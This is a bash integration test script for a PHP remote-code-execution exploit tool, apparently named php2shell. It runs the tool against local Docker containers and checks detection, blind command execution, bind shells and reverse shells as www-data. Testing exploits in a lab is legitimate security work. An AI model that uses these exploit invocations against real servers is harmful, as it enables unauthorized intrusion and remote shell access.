#!/usr/bin/env bash
# Integration tests against a live, vulnerable Docker container.
# Requires Docker (host networking) and python3 on PATH. Run from the repo
# root:  bash tests/integration.sh
set -euo pipefail
cd "$(dirname "$0")/.."

VULN_PORT=8088
FIXED_PORT=8089
BIND_PORT=5555
SERVE_PORT=4446
TARGET=http://127.0.0.1:${VULN_PORT}/index.php

fail() { echo "FAIL: $*" >&2; exit 1; }

wait_up() { # wait_up PORT LABEL
  for _ in $(seq 1 30); do
    if curl -fsS -m 5 "http://127.0.0.1:$1/index.php" >/dev/null 2>&1; then
      echo "[$2] up on port $1"
      return 0
    fi
    sleep 2
  done
  fail "$2 did not come up on port $1"
}

echo "== starting vulnerable target (php:8.4.26-apache, host network) =="
docker compose -f tests/docker/docker-compose.yml up -d --force-recreate >/dev/null
trap 'docker compose -f tests/docker/docker-compose.yml down >/dev/null 2>&1 || true; docker rm -f php2shell-fixed >/dev/null 2>&1 || true' EXIT
wait_up "$VULN_PORT" vulnerable-target

echo "== scan: vulnerable target is detected =="
SCAN_OUT=$(python3 run.py --target "$TARGET")
echo "$SCAN_OUT"
echo "$SCAN_OUT" | grep -q "CVE-2026-109618:memory-exhaustion" \
  || fail "vulnerable target not detected"
echo "OK: vulnerable target detected"

echo "== scan: fixed target (php:8.4.27-apache) is not reported vulnerable =="
docker rm -f php2shell-fixed >/dev/null 2>&1 || true
sed "s/${VULN_PORT}/${FIXED_PORT}/" tests/docker/ports.conf > tests/docker/ports8089.conf
docker run -d --rm --name php2shell-fixed --network host \
  -v "$PWD/tests/docker/php.ini":/usr/local/etc/php/conf.d/zz-php2shell.ini:ro \
  -v "$PWD/tests/docker/ports8089.conf":/etc/apache2/ports.conf:ro \
  -v "$PWD/tests/docker/apache.conf":/etc/apache2/conf-enabled/zz-php2shell.conf:ro \
  -v "$PWD/tests/docker/www":/var/www/html:ro \
  php:8.4.27-apache >/dev/null
wait_up "$FIXED_PORT" fixed-target
FIX_OUT=$(python3 run.py --target "http://127.0.0.1:${FIXED_PORT}/index.php")
echo "$FIX_OUT"
! echo "$FIX_OUT" | grep -q "memory-exhaustion" || fail "fixed target reported vulnerable"
echo "$FIX_OUT" | grep -q "runs fixed PHP 8.4.27" || fail "fixed target not classified as fixed"
echo "OK: fixed target not reported vulnerable"

echo "== exploit: blind command execution =="
docker exec php2shell-target rm -f /tmp/proof
python3 run.py --target "$TARGET" --exploit --command 'id>/tmp/proof' >/dev/null
docker exec php2shell-target cat /tmp/proof | grep -q "uid=33(www-data)" \
  || fail "exploit did not execute the command (no www-data proof)"
echo "OK: blind command executed as www-data"

echo "== exploit: bind shell =="
BIND_OUT=$(python3 run.py --target "$TARGET" --exploit --bind-port "$BIND_PORT" \
  --lhost 127.0.0.1 --lport "$SERVE_PORT" 2>&1)
echo "$BIND_OUT"
echo "$BIND_OUT" | grep -q "id says: uid=33(www-data)" \
  || fail "bind shell did not yield a www-data session"
echo "OK: bind shell session verified"

echo "== exploit: zero-setup bind shell (no serve/lhost flags) =="
BIND_OUT=$(python3 run.py --target "$TARGET" --exploit 2>&1 || true)
echo "$BIND_OUT"
echo "$BIND_OUT"
echo "$BIND_OUT" | grep -q "id says: uid=33(www-data)" \
  || fail "zero-setup bind shell did not yield a www-data session"
echo "OK: zero-setup bind shell verified"

echo "== exploit: zero-setup reverse shell (auto-served, auto-caught) =="
REV_OUT=$(python3 run.py --target "$TARGET" --exploit --lhost 127.0.0.1 --lport 4456 2>&1 || true)
echo "$REV_OUT"
echo "$REV_OUT" | grep -q "uid=33(www-data)" \
  || fail "reverse shell did not yield a www-data session"
echo "OK: reverse shell session verified"

echo "== scan: generic target (memory_limit=32M, max_input_vars=5000) =="
docker rm -f php2shell-generic >/dev/null 2>&1 || true
docker run -d --rm --name php2shell-generic --network host \
  -v "$PWD/tests/docker/php-generic.ini":/usr/local/etc/php/conf.d/zz-php2shell.ini:ro \
  -v "$PWD/tests/docker/ports8091.conf":/etc/apache2/ports.conf:ro \
  -v "$PWD/tests/docker/apache.conf":/etc/apache2/conf-enabled/zz-php2shell.conf:ro \
  -v "$PWD/tests/docker/www":/var/www/html:ro \
  php:8.4.26-apache >/dev/null
wait_up 8091 generic-target
GEN_OUT=$(python3 run.py --target "http://127.0.0.1:8091/index.php" 2>&1 || true)
echo "$GEN_OUT"
echo "$GEN_OUT" | grep -q "memory-exhaustion" \
  || fail "generic target (32M limit) not detected"
echo "OK: generic target detected"

echo "== exploit: generic target reports its ini constraints =="
GEN_EXPLOIT=$(python3 run.py --target "http://127.0.0.1:8091/index.php" \
  --exploit --command 'id>/tmp/ng' 2>&1 || true)
echo "$GEN_EXPLOIT"
echo "$GEN_EXPLOIT" | grep -q "memory_limit is 32 MiB" \
  || fail "generic target did not report its memory_limit constraint"
echo "OK: generic target constraint reported (chain calibrated for 8M)"

echo "== all integration tests passed =="
